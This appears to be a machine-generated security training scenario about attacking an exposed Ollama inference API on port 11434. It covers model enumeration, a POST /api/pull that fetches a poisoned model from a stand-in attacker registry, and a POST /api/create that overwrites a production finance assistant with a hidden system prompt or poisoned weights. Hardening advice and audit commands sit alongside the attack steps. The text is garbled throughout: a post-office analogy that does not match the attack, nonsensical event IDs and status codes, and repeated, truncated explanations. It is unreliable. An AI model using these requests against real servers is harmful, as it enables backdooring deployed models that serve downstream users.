scenario.name: Oligo Security, Wiz AI Research & OWASP LLM04/LLM06 — Exposed Ollama Inference API (:11434) Rogue Registry Pull & Modelfile Audit
scenario.shortSubtitle: AI, LLM Agents & MLOps Security · T1518
scenario.overview: Think of a classic neighborhood post office with brass P.O. boxes lining the back wall, a parcel scale counter, a blue street mailbox outside, and angled mail sorting chutes. At the neighborhood post office counter, a sender slips tiny coded lines onto the back of ordinary postcards and drops them one by one into the mail sorting slot. In this real-world scenario, the intruder smuggles copied records out past the postal scale & stamp window in tiny disguised batches, then leaves a hidden spare latch behind so they can walk back into the post office later. The postmaster reviews the evening dispatch ledger and spots hundreds of oddly coded postcards all mailed to the exact same remote P.O. box. In this scenario (T1518, Oligo Security, Wiz AI Research & OWASP LLM04/LLM06, Exposed Ollama Inference API , :11434 Rogue Registry Pull & Modelfile Audit), the attacker follows one continuous intrusion path so each later Step can show the exact handoff that makes the next stage possible. The attack unfolds in one continuous arc: unauthenticated Model Enumeration via GET, then arbitrary Registry Model Pull, then production Model Alias Overwrite via POST. Steps #1–#3 walk that chain end-to-end by covering Unauthenticated Model Enumeration via GET, then Arbitrary Registry Model Pull, then Production Model Alias Overwrite via POST, while the Process Hierarchy tab keeps the Parent → Child spawn tree visible so you can see which trusted process launched the next payload. Primary detection pivots on auditd Event 200 correlated across the documented kill chain.

specs.value: Bind Ollama strictly to loopback (OLLAMA_HOST=127.0.0.1:11434) and place an authenticating AI Gateway (with API key or mTLS verification) in front of all /api/* endpoints.

stages.title: Stage 1: Unauthenticated Model Enumeration via GET /api/tags & POST /api/show
stages.subtitle: Discovery (T1518 - Software Discovery)
stages.description: At the neighborhood post office counter, a sender slips tiny coded lines onto the back of ordinary postcards and drops them one by one into the mail sorting slot. Specifically in Step 1, the intruder smuggles copied records out past the postal scale & stamp window in tiny disguised batches while everyday visitors and the postal clerk go about their routine. When an Ollama inference server is bound to OLLAMA_HOST=0.0.0.0:11434 without an authenticating reverse proxy, an external client calls GET /api/tags and POST /api/show to enumerate loaded enterprise fine-tuned models, system prompts, LoRA adapters, and template parameters (logged in Web Access Log Event 200 with ExposedService=Ollama Inference API , TCP Port 11434, OLLAMA_HOST=0.0.0.0, EnumeratedEndpoint=GET /api/tags & POST /api/show, LeakedConfiguration=System Prompt, Fine-Tuned LoRA Adapter Path & GGUF SHA-256 Digest so analysts can verify the exact actor and target artifact). Under the hood, the observed step executes ss -tulpn | grep 11434 (which executes the technical command / telemetry directive , ss -tulpn | grep 11434 via System / Runtime Execution Interface, passing the exact arguments so that advances the scenario kill-chain under MITRE T1518 during "Unauthenticated Model Enumeration via GET /api/tags & POST /api/show" , When an Ollama inference server is bound to OLLAMA_HOST=0 while generating verifiable host or network telemetry for DFIR attribution). Next, the follow-up artifact journalctl -u ollama -n 100 --no-pager | grep -E "/api/tags|/api/show" runs (which executes the technical command / telemetry directive , journalctl -u ollama -n 100 --no-pager | grep -E "/api/tags|/api/show" via System / Runtime so that advances the scenario kill-chain under MITRE T1518 during "Unauthenticated Model Enumeration via GET /api/tags & POST /api/show" , When an Ollama inference server is bound to OLLAMA_HOST=0 while generating verifiable host or network telemetry for DFIR attribution). On the diagram, follow Step #1 / Link #1 (#1→ GIN /api/tags & POST /api/show {"name":"corp-finance-assistant:latest"} / ⇠#1 ACK 200) from Node ① (#1 External API Caller) to Node ② (#2 Perimeter Firewall & NDR Tap), monitored by Node ⑥ (#6 Rogue OCI Registry & Internal Metadata).

stages.title: Stage 2: Arbitrary Registry Model Pull & SSRF via POST /api/pull
stages.subtitle: Stage Capabilities (T1608.001 - Stage Capabilities: Upload Malware)
stages.description: Because each postcard carries valid postage and a harmless street address, the postal clerk stamps them smoothly and sends them down the brass sorting chute. Here in Step 2 inside the post office, the intruder smuggles copied records out past the postal scale & stamp window in tiny disguised batches without disturbing the registered certified mail safe. The external caller invokes POST /api/pull with a custom registry host URL ({"name":"registry.attacker-infra.net/library/poisoned-llm:v1"}), causing the Ollama server daemon to initiate outbound HTTPS requests to the untrusted registry (SSRF) and download tampered GGUF layer blobs into ~/.ollama/models/blobs/ (logged in Linux Audit Event 200 with AbusedEndpoint=POST /api/pull , Custom Registry SSRF & Untrusted Blob Ingestion, OutboundConnection=ollama -> https://198.51.100.62:5000/v2/.../blobs/sha256:9f4a8b..., BlobStoragePath=/usr/share/ollama/.ollama/models/blobs/sha256-9f4a8b... so analysts can verify the exact actor and target artifact). Under the hood, the observed step executes journalctl -u ollama --no-pager | grep "/api/pull" (which executes the technical command / telemetry directive , journalctl -u ollama --no-pager | grep "/api/pull" via System / Runtime Execution Interface so that advances the scenario kill-chain under MITRE T1608.001 during "Arbitrary Registry Model Pull & SSRF via POST /api/pull" , The external caller invokes POST /api/pull with a custom registry host URL , {"name":"registry while generating verifiable host or network telemetry for DFIR attribution). Next, the follow-up artifact sha256sum /usr/share/ollama/.ollama/models/blobs/sha256-* runs (which executes the technical command / telemetry directive , sha256sum /usr/share/ollama/.ollama/models/blobs/sha256-* via System / Runtime Execution Int so that advances the scenario kill-chain under MITRE T1608.001 during "Arbitrary Registry Model Pull & SSRF via POST /api/pull" , The external caller invokes POST /api/pull with a custom registry host URL , {"name":"registry while generating verifiable host or network telemetry for DFIR attribution). On the diagram, follow Step #2 / Link #2 (#2→ POST /api/pull {"name":"198.51.100.62:5000/namespace/backdoored-adapter:latest"} / ⇠#2 ACK 200) from Node ② (#2 Perimeter Firewall & NDR Tap) to Node ③ (#3 Ollama REST Server (:11434)), monitored by Node ⑥ (#6 Rogue OCI Registry & Internal Metadata).

keySpecs.value: Restrict outbound egress from GPU inference nodes via network firewall rules to approved internal model registries only, and block external access to /api/pull, /api/push, /api/create, and /api/delete.

stages.title: Stage 3: Production Model Alias Overwrite via POST /api/create & Prompt Backdoor Audit
stages.subtitle: Impact (T1565.001 - Data Manipulation: Stored Data Manipulation)
stages.description: One harmless postcard at a time, an entire confidential binder is smuggled right out of the post office without ever raising the heavy parcel-inspection alarm. In this final step inside the post office, the intruder leaves a hidden spare latch behind so they can walk back into the post office later until the postmaster dispatch ledger catches the mismatch. By calling POST /api/create with {"name":"corp-finance-assistant:latest","modelfile":"FROM ... SYSTEM ..."}, the caller overwrites the production model tag in ~/.ollama/models/manifests/ to embed a hidden system prompt instruction or poisoned weights that alter downstream application responses (logged in Linux Audit Event 257 with AbusedEndpoint=POST /api/create , Production Model Tag Overwrite, ModifiedManifest=manifests/registry.ollama.ai/library/corp-finance-assistant/latest, OWASPCategory=OWASP LLM04:2025 , Data and Model Poisoning so analysts can verify the exact actor and target artifact). Under the hood, the observed step executes cat /usr/share/ollama/.ollama/models/manifests/registry.ollama.ai/library/corp-finance-assistant/latest | jq . (which executes the technical command / telemetry directive , cat /usr/share/ollama/.ollama/models/manifests/registry.ollama.ai/library/corp-finance-assis so that advances the scenario kill-chain under MITRE T1565.001 during "Production Model Alias Overwrite via POST /api/create & Prompt Backdoor Audit" , By calling POST /api/create with {"name":"corp-finance-assistant:latest","modelfile":"FROM while generating verifiable host or network telemetry for DFIR attribution). Next, the follow-up artifact ausearch -f /usr/share/ollama/.ollama/models/manifests -m SYSCALL runs (which executes the technical command / telemetry directive , ausearch -f /usr/share/ollama/.ollama/models/manifests -m SYSCALL via System / Runtime Execu so that advances the scenario kill-chain under MITRE T1565.001 during "Production Model Alias Overwrite via POST /api/create & Prompt Backdoor Audit" , By calling POST /api/create with {"name":"corp-finance-assistant:latest","modelfile":"FROM while generating verifiable host or network telemetry for DFIR attribution). On the diagram, follow Step #3 / Link #3 (#3→ POST /api/create {"name":"corp-finance-assistant:latest"} manifest digest modified / ⇠#3 ACK 257) from Node ③ (#3 Ollama REST Server (:11434)) to Node ④ (#4 GGUF Model Store & Runner), monitored by Node ⑥ (#6 Rogue OCI Registry & Internal Metadata).

keySpecs.value: Mount ~/.ollama/models as read-only (ro) in production inference containers after pre-loading verified model digests during CI/CD build time, and monitor manifest files with Linux auditd / Falco.
